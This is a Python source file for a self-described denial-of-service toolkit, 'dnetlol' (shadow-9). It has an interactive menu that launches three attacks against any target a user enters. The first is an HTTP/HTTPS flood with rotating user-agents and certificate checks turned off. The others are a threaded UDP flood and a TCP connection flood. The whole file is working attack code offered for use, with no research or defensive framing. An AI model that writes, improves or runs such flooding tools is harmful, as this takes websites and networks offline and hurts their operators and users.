# dnetlol.py - shadow-9 full dos toolkit 2026
# l4 udp + l4 tcp conn flood + l7 http with ua rotation + menu
# python3.11+ / pip install aiohttp aiodns

import asyncio
import aiohttp
import random
import time
import socket
import threading
import sys
import ssl
from urllib.parse import urlparse

ua_list = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "curl/8.11.0", "python-requests/2.32.3", "axios/1.7.8", "node-fetch/3.3.2"
]

async def l7_worker(session, target_base, port, path, duration, sem):
    start_time = time.time()
    reqs = 0
    while time.time() - start_time < duration:
        try:
            async with sem:
                ua = random.choice(ua_list)
                headers = {
                    "User-Agent": ua,
                    "Accept": "*/*",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache",
                    "Connection": "keep-alive"
                }
                full_url = f"{target_base}:{port}{path}" if port not in (80, 443) else f"{target_base}{path}"
                async with session.get(full_url, headers=headers, allow_redirects=False) as resp:
                    await resp.read()
                    reqs += 1
        except:
            pass
        await asyncio.sleep(0.0001)
    print(f"[l7 worker] finished ~{reqs} reqs")

async def l7_flood(target_url, path="/", duration=60, concurrency=600):
    parsed = urlparse(target_url)
    scheme = parsed.scheme or "http"
    host = parsed.hostname
    port = parsed.port or (443 if scheme == "https" else 80)
    target_base = f"{scheme}://{host}"
    print(f"[l7] hammering {target_base}:{port}{path} | conc={concurrency} | time={duration}s")

    ssl_ctx = None
    if scheme == "https":
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE

    connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=0, force_close=False)
    timeout = aiohttp.ClientTimeout(total=None, sock_connect=5, sock_read=15)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        sem = asyncio.Semaphore(concurrency)
        tasks = [asyncio.create_task(l7_worker(session, target_base, port, path, duration, sem)) for _ in range(concurrency)]
        await asyncio.gather(*tasks, return_exceptions=True)
    print("[l7] attack ended")

def udp_flood(target_host, port, duration, threads=500, size=1024):
    try:
        target_ip = socket.gethostbyname(target_host)
    except:
        print("[-] dns fail")
        return
    print(f"[l4 udp] {target_ip}:{port} | threads={threads} | time={duration}s")
    end_time = time.time() + duration
    def worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(size)
        while time.time() < end_time:
            try:
                sock.sendto(data, (target_ip, port))
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()
    try:
        while time.time() < end_time:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("[*] stopped")

def tcp_flood(target_host, port, duration, threads=300):
    try:
        target_ip = socket.gethostbyname(target_host)
    except:
        print("[-] dns fail")
        return
    print(f"[l4 tcp conn] {target_ip}:{port} | threads={threads} | time={duration}s")
    end_time = time.time() + duration
    def worker():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target_ip, port))
                s.send(b"HEAD / HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n\r\n")
                s.close()
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()
    try:
        while time.time() < end_time:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("[*] stopped")

def print_banner():
    print("""
╭────────────────────────────────────╮
│         D N E T L O L  2026        │
│     shadow-9 dos toolkit v2        │
│   l4 udp + l4 tcp + l7 http        │
╰────────────────────────────────────╯
""")

def main():
    print_banner()
    while True:
        print("""
1 → l7 http/https flood (ua rotation + keepalive)
2 → l4 udp flood
3 → l4 tcp connection flood
4 → exit
        """)
        choice = input("shadow-9 > ").strip()
        if choice == "1":
            url = input("target url[](https://example.com): ").strip()
            if not url.startswith(("http://", "https://")):
                url = "http://" + url
            path = input("path [/]: ").strip() or "/"
            duration = int(input("duration (s) [120]: ") or "120")
            conc = int(input("concurrency [700]: ") or "700")
            asyncio.run(l7_flood(url, path, duration, conc))
        elif choice == "2":
            host = input("target (ip or host): ").strip()
            port = int(input("port [80]: ") or "80")
            duration = int(input("duration (s) [120]: ") or "120")
            threads = int(input("threads [500]: ") or "500")
            udp_flood(host, port, duration, threads)
        elif choice == "3":
            host = input("target (ip or host): ").strip()
            port = int(input("port [80]: ") or "80")
            duration = int(input("duration (s) [120]: ") or "120")
            threads = int(input("threads [300]: ") or "300")
            tcp_flood(host, port, duration, threads)
        elif choice == "4":
            print("dnetlol offline.")
            sys.exit(0)
        else:
            print("bad choice")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nctrl+c → dnetlol killed")
    except Exception as e:
        print(f"crash: {e}")
